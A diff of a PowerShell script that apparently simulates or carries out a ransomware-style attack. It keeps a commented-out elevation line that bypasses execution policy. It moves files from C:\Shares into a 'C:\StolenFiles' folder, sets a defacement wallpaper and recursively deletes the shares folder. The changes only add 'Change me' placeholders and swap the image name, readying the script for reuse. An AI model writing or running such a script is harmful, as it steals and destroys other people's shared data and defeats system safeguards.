@@ -1,6 +1,8 @@
 #Start-Process powershell -Verb runAs
 #if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
-
+#
+# Change me 
+#
 $Source = "C:\Shares"
 $Destination = "C:\StolenFiles"
 for ($i = 1; $i -le 100; $i++ )
@@ -95,8 +97,12 @@ Function Update-Wallpaper {
         }
     [Wallpaper.Setter]::SetWallpaper( $Path, $Style )
 }
-
-Update-Wallpaper C:\Pictures\r.png Tile
+# you need to put in the proper path
+#
+# Change me 
+#
+Update-Wallpaper C:\Pictures\accipiter.png Tile
+#
 #background end
 # Delete the shares folder 
 Remove-Item 'C:\Shares' -Recurse
